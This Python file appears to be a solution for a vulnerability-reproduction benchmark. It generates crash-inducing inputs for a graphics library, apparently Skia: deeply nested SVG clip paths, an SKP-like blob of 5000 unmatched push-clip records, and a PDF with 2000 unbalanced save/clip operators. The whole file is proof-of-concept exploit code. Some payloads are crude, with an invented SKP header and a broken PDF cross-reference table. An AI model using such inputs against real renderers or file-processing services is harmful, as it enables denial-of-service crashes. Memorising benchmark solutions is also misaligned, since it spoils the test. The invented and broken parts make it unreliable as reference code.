import tarfile
import tempfile
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for relevant files to understand the format
            root_dir = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            
            # Search for file extensions that might contain format info
            cpp_files = []
            for root, dirs, files in os.walk(root_dir):
                for file in files:
                    if file.endswith(('.cpp', '.cc', '.cxx', '.c')):
                        cpp_files.append(os.path.join(root, file))
            
            # Analyze files to determine format (look for clip/layer stack)
            format_hint = None
            for file_path in cpp_files[:50]:  # Check first 50 files
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if 'clip' in content.lower() and 'layer' in content.lower():
                            # Look for format identifiers
                            if '.skp' in content or 'SkPicture' in content:
                                format_hint = 'skp'
                                break
                            elif '.svg' in content:
                                format_hint = 'svg'
                                break
                            elif '.pdf' in content:
                                format_hint = 'pdf'
                                break
                except:
                    continue
            
            # Default to SVG if format not determined
            if format_hint is None:
                format_hint = 'svg'
            
            # Generate PoC based on format
            if format_hint == 'svg':
                return self._generate_svg_poc()
            elif format_hint == 'skp':
                return self._generate_skp_poc()
            elif format_hint == 'pdf':
                return self._generate_pdf_poc()
            else:
                return self._generate_svg_poc()
    
    def _generate_svg_poc(self) -> bytes:
        """Generate SVG with deeply nested clip paths"""
        # Create SVG with 1000 levels of nested clip paths
        svg_content = ['<?xml version="1.0" encoding="UTF-8"?>',
                      '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
                      '<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1000" height="1000">',
                      '<defs>']
        
        # Create deeply nested clip paths
        for i in range(1000):
            svg_content.append(f'<clipPath id="clip{i}">')
            svg_content.append(f'  <rect x="0" y="0" width="100" height="100"/>')
            if i > 0:
                svg_content.append(f'  <use xlink:href="#clip{i-1}" clip-path="url(#clip{i-1})"/>')
        
        # Close all clipPath tags
        for i in range(1000):
            svg_content.append('</clipPath>')
        
        svg_content.append('</defs>')
        svg_content.append('<rect width="100%" height="100%" fill="red" clip-path="url(#clip999)"/>')
        svg_content.append('</svg>')
        
        return '\n'.join(svg_content).encode()
    
    def _generate_skp_poc(self) -> bytes:
        """Generate minimal SKP-like binary with deep nesting"""
        # SKP header (simplified)
        poc = bytearray()
        
        # Simple header indicating version
        poc.extend(b'Skia Picture\0')
        poc.extend((1).to_bytes(4, 'little'))  # Version
        
        # Create deep nesting by repeating push/pop clip operations
        # This is a simplified representation
        for i in range(5000):
            # Push clip operation
            poc.extend(b'PUSH_CLIP')
            # Clip rect data
            poc.extend((i % 1000).to_bytes(4, 'little'))
            poc.extend(((i * 2) % 1000).to_bytes(4, 'little'))
            poc.extend(((i * 3) % 1000).to_bytes(4, 'little'))
            poc.extend(((i * 4) % 1000).to_bytes(4, 'little'))
        
        # No corresponding pop operations to overflow stack
        
        return bytes(poc)
    
    def _generate_pdf_poc(self) -> bytes:
        """Generate PDF with deeply nested clipping paths"""
        pdf_content = [
            '%PDF-1.4',
            '1 0 obj',
            '<< /Type /Catalog /Pages 2 0 R >>',
            'endobj',
            '2 0 obj',
            '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
            'endobj',
            '3 0 obj',
            '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>',
            'endobj',
            '4 0 obj',
            '<< /Length 1000 >>',
            'stream'
        ]
        
        # PDF graphics commands with deeply nested clipping
        stream = []
        stream.append('q')  # Save state
        
        # Create deeply nested clipping paths
        for i in range(2000):
            stream.append(f'{i % 100} {i % 100} {100 + i % 100} {100 + i % 100} re')  # Rectangle
            stream.append('W')  # Clip
            stream.append('n')  # End path without filling
            stream.append('q')  # Save state (nested)
        
        # No corresponding restore operations
        
        pdf_content.append('\n'.join(stream))
        pdf_content.append('endstream')
        pdf_content.append('endobj')
        pdf_content.append('xref')
        pdf_content.append('0 5')
        pdf_content.append('0000000000 65535 f')
        pdf_content.append('trailer')
        pdf_content.append('<< /Size 5 /Root 1 0 R >>')
        pdf_content.append('startxref')
        pdf_content.append('0')
        pdf_content.append('%%EOF')
        
        return '\n'.join(pdf_content).encode()